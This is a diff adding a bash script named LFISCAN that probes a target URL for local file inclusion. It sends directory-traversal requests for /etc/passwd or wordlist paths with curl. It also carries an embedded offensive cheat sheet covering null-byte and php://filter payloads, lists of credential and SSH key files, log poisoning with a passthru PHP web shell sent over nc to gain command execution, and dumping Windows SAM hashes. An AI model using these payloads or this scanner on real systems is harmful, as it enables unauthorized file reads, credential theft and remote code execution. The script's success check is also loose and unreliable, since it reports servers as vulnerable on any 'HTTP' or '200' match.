@@ -1,0 +1,486 @@
+#!/bin/bash
+
+####################################################################################################################################################
+function ADVANCED(){
+
+printf -- "##############################\n"
+printf -- "# Local File Inclusion (LFI) #\n"
+printf -- "##############################\n"
+printf -- "########################################################################################################\n"
+printf -- "# Local file inclusion means unauthorized access to files on the system.                               #\n"
+printf -- "# This vulnerability lets the attacker gain access to sensitive files on the server                    #\n"
+printf -- "# and it might also lead to gaining a shell.                                                           #\n"
+printf -- "#                                                                                                      #\n"
+printf -- "# The vulnerability stems from unsanitized user-input. LFI is particularly common in php-sites.        #\n"
+printf -- "# Here is an example of php-code vulnerable to LFI.                                                    #\n"
+printf -- "# As you can see we just pass in the url-parameter into the require-function without any sanitization. #\n"
+printf -- "# So the user can just add the path to any file.                                                       #\n"
+printf -- "#  ###########################                                                                         #\n"
+printf -- "#  # \$file = \$_GET['page'];  #                                                                         #\n"
+printf -- "#  # require(\$file);         #                                                                         #\n"
+printf -- "#  ###########################                                                                         #\n"
+printf -- "########################################################################################################\n"
+printf -- "\n"
+printf -- "###################################################################################################\n"
+printf -- "# In this example the user could just enter this string and retrieve the /etc/passwd file.        #\n"
+printf -- "#                                                                                                 #\n"
+printf -- "# http://example.com/page=../../../../../../etc/passwd                                            #\n"
+printf -- "#                                                                                                 #\n"
+printf -- "##########################################################                                        #\n"
+printf -- "# Bypassing the added .php and other extra file-endings  #                                        #\n"
+printf -- "##########################################################                                        #\n"
+printf -- "#                                                                                                 #\n"
+printf -- "# It is common to add the file-extension through the php-code. Here is how this would look like:  #\n"
+printf -- "#                                                                                                 #\n"
+printf -- "#                                                                                                 #\n"
+printf -- "#  ############################                                                                   #\n"
+printf -- "#  # \$file = \$_GET['page'];   #                                                                   #\n"
+printf -- "#  # require(\$file . \".php\"); #                                                                   #\n"
+printf -- "#  ############################                                                                   #\n"
+printf -- "#                                                                                                 ########################\n"
+printf -- "#                                                                                                                        #\n"
+printf -- "# The php is added to the filename, this will mean that we will not be able to find the files we are looking for.        #\n"
+printf -- "# Since the file /etc/passwd.php does not exist.                                                                         #\n"
+printf -- "# However, if we add the nullbyte to the end of our attack-string the .php will not be taken into account.               #\n"
+printf -- "# So we add %%00 to the end of our attack-string.                                                                         #\n"
+printf -- "#                                                                                                                        #\n"
+printf -- "# http://example.com/page=../../../../../../etc/passwd%%00                                                                #\n"
+printf -- "#                                                                                                                        #\n"
+printf -- "# This technique is usually called the nullbyte technique since %00 is the nullbyte.                                        #\n"
+printf -- "# The technique only works in versions below php 5.3. So look out for that.                                              #\n"
+printf -- "#                                                                                                                        #\n"
+printf -- "# Another way to deal with this problem is just to add a question mark to your attack-string.                            #\n"
+printf -- "# This way the stuff after gets interpreted as a parameter and therefore excluded. Here is an example:                   #\n"
+printf -- "#                                                                                                                        #\n"
+printf -- "# http://example.com/page=../../../../../../etc/passwd?                                                                  #\n"
+printf -- "##########################################################################################################################\n"
+printf -- "\n"
+printf -- "################################################################################################################\n"
+printf -- "# Bypassing php-execution #                                                                                    #\n"
+printf -- "###########################                                                                                    #\n"
+printf -- "#                                                                                                              #\n"
+printf -- "# So if you have an LFI you can easily read .txt-files but not .php files.                                     #\n"
+printf -- "# That is because they get executed by the webserver, since their file-ending says that it contains code.      #\n"
+printf -- "# This can be bypassed by using a build-in php-filter.                                                         #\n"
+printf -- "#                                                                                                              #\n"
+printf -- "# http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index                          #\n"
+printf -- "#                                                                                                              #\n"
+printf -- "# Here you use a php-filter to convert it all into base64.                                                     #\n"
+printf -- "# So in return you get the whole page base64 encoded.                                                          #\n"
+printf -- "# Now you only need to decode it. Save the base64-text into a file and then run:                               #\n"
+printf -- "#                                                                                                              #\n"
+printf -- "# base64 -d savefile.php                                                                                       #\n"
+printf -- "################################################################################################################\n"
+printf -- "\n"
+printf -- "###################################################################################################\n"
+printf -- "# Linux  #                                                                                        #\n"
+printf -- "# Tricks #                                                                                        #\n"
+printf -- "##########                                                                                        #\n"
+printf -- "#                                                                                                 #\n"
+printf -- "# Download config-files in a nice style-format                                                    #\n"
+printf -- "#                                                                                                 #\n"
+printf -- "# If you read files straight in the browser the styling can becomes unbearable.                   #\n"
+printf -- "# Really difficult to read. A way around it is to download the files from the terminal.           #\n"
+printf -- "# But that won't work if there is a login that is blocking it. So this is a great workaround:     #\n"
+printf -- "#                                                                                                 #\n"
+printf -- "# First we save the cookie                                                                        #\n"
+printf -- "# curl -s http://example.com/login.php -c cookiefile -d \"user=admin&pass=admin\"                   #\n"
+printf -- "# curl -s http://example.com/gallery.php?page=/etc/passwd -b cookiefile                           #\n"
+printf -- "###################################################################################################\n"
+printf -- "\n"
+printf -- "##########################################################################################################################\n"
+printf -- "# Sensitive file #                                                                                                       #\n"
+printf -- "##################                                                                                                       #\n"
+printf -- "#                                                                                                                        #\n"
+printf -- "# This is the default layout of important apache files.                                                                  #\n"
+printf -- "# https://wiki.apache.org/httpd/DistrosDefaultLayout                                                                     #\n"
+printf -- "#                                                                                                                        #\n"
+printf -- "# /etc/issue (A message or system identification to be printed before the login prompt.)                                 #\n"
+printf -- "# /etc/motd (Message of the day banner content. Can contain information about the system owners or use of the system.)   #\n"
+printf -- "# /etc/passwd                                                                                                            #\n"
+printf -- "# /etc/group                                                                                                             #\n"
+printf -- "# /etc/resolv.conf (might be better than /etc/passwd for triggering IDS sigs)                                            #\n"
+printf -- "# /etc/shadow                                                                                                            #\n"
+printf -- "# /home/[USERNAME]/.bash_history or .profile                                                                             #\n"
+printf -- "# ~/.bash_history or .profile                                                                                            #\n"
+printf -- "# $USER/.bash_history or .profile                                                                                         #\n"
+printf -- "# /root/.bash_history or .profile                                                                                        #\n"
+printf -- "#                                                                                                                        #\n"
+printf -- "# Comes from here: https://gist.github.com/sckalath/a8fd4e754a72015aa0b8                                                 #\n"
+printf -- "#                                                                                                                        #\n"
+printf -- "# /etc/mtab                                                                                                              #\n"
+printf -- "# /etc/inetd.conf                                                                                                        #\n"
+printf -- "# /var/log/dmessage                                                                                                      #\n"
+printf -- "##########################################################################################################################\n"
+printf -- "\n"
+printf -- "##############################################\n"
+printf -- "# Web server files #                         #\n"
+printf -- "####################                         #\n"
+printf -- "#                                            #\n"
+printf -- "# Usually found in the root of the website   #\n"
+printf -- "# .htaccess                                  #\n"
+printf -- "# config.php                                 #\n"
+printf -- "##############################################\n"
+printf -- "\n"
+printf -- "#####################\n"
+printf -- "# SSH #             #\n"
+printf -- "#######             #\n"
+printf -- "#                   #\n"
+printf -- "# authorized_keys   #\n"
+printf -- "# id_rsa            #\n"
+printf -- "# id_rsa.keystore   #\n"
+printf -- "# id_rsa.pub        #\n"
+printf -- "# known_hosts       #\n"
+printf -- "#####################\n"
+printf -- "\n"
+printf -- "########################################\n"
+printf -- "# Logs #                               #\n"
+printf -- "########                               #\n"
+printf -- "#                                      #\n"
+printf -- "# /etc/httpd/logs/acces_log            #\n"
+printf -- "# /etc/httpd/logs/error_log            #\n"
+printf -- "# /var/www/logs/access_log             #\n"
+printf -- "# /var/www/logs/access.log             #\n"
+printf -- "# /usr/local/apache/logs/access_ log   #\n"
+printf -- "# /usr/local/apache/logs/access. log   #\n"
+printf -- "# /var/log/apache/access_log           #\n"
+printf -- "# /var/log/apache2/access_log          #\n"
+printf -- "# /var/log/apache/access.log           #\n"
+printf -- "# /var/log/apache2/access.log          #\n"
+printf -- "# /var/log/access_log                  #\n"
+printf -- "########################################\n"
+printf -- "\n"
+printf -- "#################################\n"
+printf -- "# User specific files #         #\n"
+printf -- "#################################\n"
+printf -- "#                               #\n"
+printf -- "# Found in the home-directory   #\n"
+printf -- "#                               #\n"
+printf -- "# .bash_history                 #\n"
+printf -- "# .mysql_history                #\n"
+printf -- "# .my.cnf                       #\n"
+printf -- "#################################\n"
+printf -- "\n"
+printf -- "##########################################################################################\n"
+printf -- "# Proc files #                                                                           #\n"
+printf -- "##############                                                                           #\n"
+printf -- "#                                                                                        #\n"
+printf -- "# Under Linux, /proc includes a directory for each running process                       #\n"
+printf -- "# including kernel processes                                                             #\n"
+printf -- "# in directories named /proc/PID, where PID is the process number.                       #\n"
+printf -- "# Each directory contains information about one process, including: /proc/PID/cmdline    #\n"
+printf -- "# the command that originally started the process.                                       #\n"
+printf -- "#                                                                                        #\n"
+printf -- "#                                                                                        #\n"
+printf -- "# https://en.wikipedia.org/wiki/Procfs                                                   #\n"
+printf -- "#                                                                                        #\n"
+printf -- "# https://blog.netspi.com/directory-traversal-file-inclusion-proc-file-system/           #\n"
+printf -- "#                                                                                        #\n"
+printf -- "# /proc/sched_debug # Can be used to see what processes the machine is running           #\n"
+printf -- "# /proc/mounts                                                                           #\n"
+printf -- "# /proc/net/arp                                                                          #\n"
+printf -- "# /proc/net/route                                                                        #\n"
+printf -- "# /proc/net/tcp                                                                          #\n"
+printf -- "# /proc/net/udp                                                                          #\n"
+printf -- "# /proc/net/fib_trie                                                                     #\n"
+printf -- "# /proc/version                                                                          #\n"
+printf -- "# /proc/self/environ                                                                     #\n"
+printf -- "##########################################################################################\n"
+printf -- "\n"
+printf -- "##########################################################################################\n"
+printf -- "# Bruteforcing SSH known_hosts                                                           #\n"
+printf -- "#                                                                                        #\n"
+printf -- "# https://blog.rootshell.be/2010/11/03/bruteforcing-ssh-known_hosts-files/               #\n"
+printf -- "#                                                                                        #\n"
+printf -- "##########################################################################################\n"
+printf -- "\n"
+printf -- "##########################################################################################\n"
+printf -- "# LFI to RCE ( SERVER LOG POISONING ) #                                                  #\n"
+printf -- "#######################################                                                  #\n"
+printf -- "# Under the right circumstances you might be able to get a shell from a LFI              #\n"
+printf -- "# Log poisoning                                                                          #\n"
+printf -- "#                                                                                        #\n"
+printf -- "# There are some requirements. We need to be able to read log files.                     #\n"
+printf -- "# In this example we are going to poison the apache log file.                            #\n"
+printf -- "# You can use either the success.log or the error.log                                    #\n"
+printf -- "#                                                                                        #\n"
+printf -- "# So once you have found a LFI vuln you have to                                          #\n"
+printf -- "# inject php-code into the log file and then execute it.                                 #\n"
+printf -- "#                                                                                        #\n"
+printf -- "# Insert php-code into the log file                                                      #\n"
+printf -- "#                                                                                        #\n"
+printf -- "# This can be done with nc or telnet.                                                    #\n"
+printf -- "#                                                                                        #\n"
+printf -- "# nc 192.168.1.102 80                                                                    #\n"
+printf -- "# GET /<?php passthru($_GET['cmd']); ?> HTTP/1.1                                              #\n"
+printf -- "# Host: 192.168.1.102                                                                    #\n"
+printf -- "# Connection: close                                                                      #\n"
+printf -- "#                                                                                        #\n"
+printf -- "# You can also add it to the error-log by making a request to a page that doesn't exists #\n"
+printf -- "#                                                                                        #\n"
+printf -- "# nc 192.168.1.102 80                                                                    #\n"
+printf -- "# GET /AAAAAA<?php passthru($_GET['cmd']); ?> HTTP/1.1                                        #\n"
+printf -- "# Host: 192.168.1.102                                                                    #\n"
+printf -- "# Connection: close                                                                      #\n"
+printf -- "#                                                                                        #\n"
+printf -- "# Or in the referer parameter.                                                           #\n"
+printf -- "#                                                                                        #\n"
+printf -- "# GET / HTTP/1.1                                                                         #\n"
+printf -- "# Referer: <? passthru($_GET[cmd]) ?>                                                         #\n"
+printf -- "# Host: 192.168.1.159                                                                    #\n"
+printf -- "# Connection: close                                                                      #\n"
+printf -- "#                                                                                        #\n"
+printf -- "#                                                                                        #\n"
+printf -- "# Execute it in the browser                                                              #\n"
+printf -- "#                                                                                        #\n"
+printf -- "# Now you can request the log-file through the LFI and see the php-code get executed.    #\n"
+printf -- "#                                                                                        #\n"
+printf -- "# http://192.168.1.102/index.php?page=../../../../../var/log/apache2/access.log&cmd=id   #\n"
+printf -- "##########################################################################################\n"
+printf -- "\n"
+printf -- "##########################################################################################################\n"
+printf -- "# Proc files #                                                                                           #\n"
+printf -- "##############                                                                                           #\n"
+printf -- "#                                                                                                        #\n"
+printf -- "# If you can read the proc-files on the system you might be able to poison them through the user-agent.  #\n"
+printf -- "#                                                                                                        #\n"
+printf -- "# We can also inject code into /proc/self/environ through the user-agent                                 #\n"
+printf -- "#                                                                                                        #\n"
+printf -- "# https://www.exploit-db.com/papers/12992/                                                               #\n"
+printf -- "#                                                                                                        #\n"
+printf -- "# https://www.youtube.com/watch?v=ttTVNcPnsJY                                                            #\n"
+printf -- "##########################################################################################################\n"
+printf -- "\n"
+printf -- "#############################################################\n"
+printf -- "# Windows #                                                 #\n"
+printf -- "###########                                                 #\n"
+printf -- "#                                                           #\n"
+printf -- "# Fingerprinting                                            #\n"
+printf -- "#                                                           #\n"
+printf -- "# c:\\WINDOWS\\system32\/\beula.txt                              #\n"
+printf -- "# c:\/\bboot.ini                                               #\n"
+printf -- "# c:\\WINDOWS\\win.ini                                        #\n"
+printf -- "# c:\\WINNT\\win.ini                                          #\n"
+printf -- "# c:\\WINDOWS\\Repair\\SAM                                     #\n"
+printf -- "# c:\\WINDOWS\\php.ini                                        #\n"
+printf -- "# c:\\WINNT\\php.ini                                          #\n"
+printf -- "# c:\\Program Files\\Apache Group\\Apache\\conf\\httpd.conf      #\n"
+printf -- "# c:\\Program Files\\Apache Group\\Apache2\\conf\\httpd.conf     #\n"
+printf -- "# c:\\Program Files\/\bxampp\/\bapache\\conf\\httpd.conf             #\n"
+printf -- "# c:\\php\\php.ini                                            #\n"
+printf -- "# c:\\php5\\php.ini                                           #\n"
+printf -- "# c:\\php4\\php.ini                                           #\n"
+printf -- "# c:\/\bapache\\php\\php.ini                                     #\n"
+printf -- "# c:\/\bxampp\/\bapache\/\bbin\\php.ini                               #\n"
+printf -- "# c:\\home\b2\/\bbin\\stable\/\bapache\\php.ini                         #\n"
+printf -- "# c:\\home\/\bbin\\stable\/\bapache\\php.ini                         #\n"
+printf -- "#############################################################\n"
+printf -- "\n"
+printf -- "#############################################################\n"
+printf -- "# Logs #                                                    #\n"
+printf -- "#############################################################\n"
+printf -- "#                                                           #\n"
+printf -- "# Common path for apache log files on windows:              #\n"
+printf -- "#                                                           #\n"
+printf -- "# c:\\Program Files\\Apache Group\\Apache\\logs\/\baccess.log      #\n"
+printf -- "# c:\\Program Files\\Apache Group\\Apache\\logs\/\berror.log       #\n"
+printf -- "#                                                           #\n"
+printf -- "#                                                           #\n"
+printf -- "# PHP Session Locations                                     #\n"
+printf -- "#                                                           #\n"
+printf -- "# c:\\WINDOWS\\TEMP\\                                          #\n"
+printf -- "# c:\\php\\sessions\\                                          #\n"
+printf -- "# c:\\php5\\sessions\\                                         #\n"
+printf -- "# c:\\php4\\sessions\\                                         #\n"
+printf -- "#                                                           #\n"
+printf -- "# Retrieving password hashes                                #\n"
+printf -- "#                                                           #\n"
+printf -- "# In order to retrieve the systems password hashed          #\n"
+printf -- "# we need two files: system and SAM.                        #\n"
+printf -- "# Once you have those two files you can extract             #\n"
+printf -- "# the hased using the kali tool pwdump, like this:          #\n"
+printf -- "#                                                           #\n"
+printf -- "# pwdump systemfile samfile                                 #\n"
+printf -- "#                                                           #\n"
+printf -- "# The system and SAM files can be found in different        #\n"
+printf -- "# locations, so try them all. From a webserver the path     #\n"
+printf -- "# might be case-sensitive, even though it is windows.       #\n"
+printf -- "# So consider that!                                         #\n"
+printf -- "#                                                           #\n"
+printf -- "# Systemroot is usually windows                             #\n"
+printf -- "# windows\/\brepair\\SAM                                        #\n"
+printf -- "# %%SYSTEMROOT%%\/\brepair\\SAM                                   #\n"
+printf -- "# %%SYSTEMROOT%%\\System32\/\bconfig\\RegBack\\SAM                  #\n"
+printf -- "# %%SYSTEMROOT%%\\System32\/\bconfig\\SAM                          #\n"
+printf -- "#                                                           #\n"
+printf -- "#                                                           #\n"
+printf -- "# %%SYSTEMROOT%%\/\brepair\\system                                #\n"
+printf -- "# %%SYSTEMROOT%%\\System32\/\bconfig\\SYSTEM                       #\n"
+printf -- "# %%SYSTEMROOT%%\\System32\/\bconfig\\RegBack\\system               #\n"
+printf -- "#############################################################\n"
+printf -- "\n"
+printf -- "########################################################################################\n"
+printf -- "# References:                                                                          #\n"
+printf -- "#                                                                                      #\n"
+printf -- "# https://sushant747.gitbooks.io/total-oscp-guide/content/local_file_inclusion.html    #\n"
+printf -- "#                                                                                      #\n"
+printf -- "# This is the definitive guide to Local File inclusion                                 #\n"
+printf -- "# https://highon.coffee/blog/lfi-cheat-sheet/                                          #\n"
+printf -- "#                                                                                      #\n"
+printf -- "# And this                                                                             #\n"
+printf -- "# http://securityidiots.com/Web-Pentest/LFI                                            #\n"
+printf -- "#                                                                                      #\n"
+printf -- "#                                                                                      #\n"
+printf -- "# And this:                                                                            #\n"
+printf -- "#                                                                                      #\n"
+printf -- "# https://websec.wordpress.com/2010/02/22/exploiting-php-file-inclusion-overview/      #\n"
+printf -- "#                                                                                      #\n"
+printf -- "# https://nets.ec/File_Inclusion                                                       #\n"
+printf -- "#                                                                                      #\n"
+printf -- "# https://gist.github.com/sckalath/da1a232f362a700ab459                                #\n"
+printf -- "########################################################################################\n"
+exit
+}
+##################################################################################################################################################
+
+########## SYSTEM PATH AND MAKE DIR WIHOUT ERROR #####
+tempfiles="/tmp/tmp_lfiscan/"
+mkdir "$tempfiles" 2>/dev/null
+#####################################################
+
+rm -r /tmp/tmp_lfiscan/* 2>/dev/null
+
+### output filename based on date ###
+systime=$(date +"%m_%d_%Y_%T")
+outputfile="$systime.LFISCAN"
+####################################
+## it itinerations in loop, possible_file var, chr string ../ ###
+it=5
+possible_file="/etc/passwd"
+chr="../"
+################################################################
+
+
+###########################################################################################
+function HELP(){
+	printf "LFISCAN v0.1\nUsage bash lfiscan <url>\n\n"
+	printf -- "-AH       --advanced-info      Show advanced information about LFI vuln\n"
+	printf -- "-d        --directory          Specify directory manually\n"
+	printf -- "-h        --help               Help\n"
+	printf -- "-w        --wordlist           Specify directory wordlist\n\n"
+	printf -- "Scan results will be stored automatically in $tempfiles folder\n\n"
+	printf -- "Example bash lfiscan http://ghost.server/index.php?page= -d wordlist.txt\n"
+	exit
+}
+###########################################################################################
+
+function isvuln_msg(){
+#tune me
+# linux
+	if [[ $(grep 'bin' /tmp/tmp_lfiscan/*.LFISCAN) == *":0:0:"* ]] || [[ $(grep 'HW type' /tmp/tmp_lfiscan/*.LFISCAN) == *"HW type"* ]];
+	then
+		printf "\n\n[\e[0;32m+\e[0m]\e[1m Is vulnerable to LFI\e[0m\n"
+	fi
+# windows
+	if [[ $(grep 'This product contains software licensed under terms which require Microsoft to display the following' /tmp/tmp_lfiscan/*.LFISCAN) == *"This product contains software licensed under terms which require Microsoft to display the following"* ]] || [[ $(grep '200' /tmp/tmp_lfiscan/*.LFISCAN) == *"200"* ]] || [[ $(grep 'HTTP' /tmp/tmp_lfiscan/*.LFISCAN) == *"HTTP"* ]] || [[ $(grep ':tid' /tmp/tmp_lfiscan/*.LFISCAN) == *":tid"* ]] || [[ $(grep 'pid' /tmp/tmp_lfiscan/*.LFISCAN) == *"pid"* ]] || [[ $(grep 'PHP Warning:' /tmp/tmp_lfiscan/*.LFISCAN) == *"PHP Warning:"* ]] || [[ $(grep 'ssl:warn' /tmp/tmp_lfiscan/*.LFISCAN) == *"ssl:warn"* ]] || [[ $(grep 'core:notice' /tmp/tmp_lfiscan/*.LFISCAN) == *"core:notice"* ]] || [[ $(grep 'child process' /tmp/tmp_lfiscan/*.LFISCAN) == *"child process"* ]] || [[ $(grep 'worker threads' /tmp/tmp_lfiscan/*.LFISCAN) == *"worker threads"* ]]
+	then
+		printf "\n\n[\e[0;32m+\e[0m]\e[1m Is vulnerable to LFI\e[0m\n"
+	fi
+
+}
+
+################### external args help ########################
+for args in "$@"
+do
+	if [ "$args" == "-h" ] || [ "$args" == "--help" ];
+	then
+		HELP
+		exit
+	fi
+
+
+	if [ "$args" == "-AH" ] || [ "$args" == "--advanced-info" ];
+	then
+		ADVANCED
+		exit
+	fi
+done
+###############################################################
+
+
+
+if [ "$1" == "-w" ] || [ "$1" == "-h" ] || [ "$1" == "-d" ] || [ "$1" == "" ];
+then
+	HELP
+	exit
+fi
+
+
+########################################################################################################## MAIN
+if [ "$1" != "-w" ] || [ "$1" != "-h" ] || [ "$1" != "-d" ] && [ "$2" != "-d" ] && [ "$2" != "-w" ] && [ "$2" != "--directory" ] && [ "$2" != "--wordlist" ];
+then
+	printf "Scanning $1\n"
+	printf "Default directory is set to $possible_file\n"
+	sleep 2
+
+	printf "\n\e[1;31m[ URL ] -->\e[0m \e[1m$1$possible_file\e[0m\n" >> "$tempfiles$outputfile"
+        curl -s "$1$possible_file" >> "$tempfiles$outputfile"
+
+	for ((h = 0; h < it; h++));do
+		possible_file="$chr$possible_file"
+        	printf "\n\e[1;31m[ URL ] -->\e[0m \e[1m$1$possible_file\e[0m\n" >> "$tempfiles$outputfile"
+        	curl -s "$1$possible_file" >> "$tempfiles$outputfile"
+	done
+
+	cat "$tempfiles/$outputfile"
+
+fi
+
+
+###########################################################################################################
+
+
+############################################################################################################## DIRECTORY
+if [ "$2" == "-d" ] || [ "$2" == "--directory" ];
+then
+	possible_file="$3"
+	printf "\n\e[1;31m[ URL ] -->\e[0m \e[1m$1$possible_file\e[0m\n" >> "$tempfiles$outputfile"
+	curl -s "$1$possible_file" >> "$tempfiles$outputfile"
+	for (( d = 0; d < it; d++));do
+		possible_file="$chr$possible_file"
+		printf "\n\e[1;31m[ URL ] -->\e[0m \e[1m$1$possible_file\e[0m\n" >> "$tempfiles$outputfile"
+		curl -s "$1$possible_file" >> "$tempfiles$outputfile"
+	done
+
+	cat "$tempfiles/$outputfile"
+
+fi
+###########################################################################################################################
+
+
+############################################################################################################# WORDLIST
+if [ "$2" == "-w" ] || [ "$2" == "--wordlist" ]  || [ "$4" == "-w" ] || [ "$4" == "--wordlist" ];
+then
+	upfile=$(cat "$3")
+	for j in $upfile;
+	do
+		##### inside thisloop
+		printf "\n\e[1;31m[ URL ] -->\e[0m \e[1m$1$j\e[0m\n" >> "$tempfiles$outputfile"
+		curl -s "$1$j" >> "$tempfiles$outputfile"
+		######################
+
+		for ((m = 0; m < it; m++));
+        	do
+			j="$chr$j"
+        		printf "\n\e[1;31m[ URL ] -->\e[0m \e[1m$1$j\e[0m\n" >> "$tempfiles$outputfile"
+        		curl -s "$1$j" >> "$tempfiles$outputfile"
+		done
+	done
+
+	cat "$tempfiles/$outputfile"
+
+
+fi
+###############################################################################################################
+
+isvuln_msg
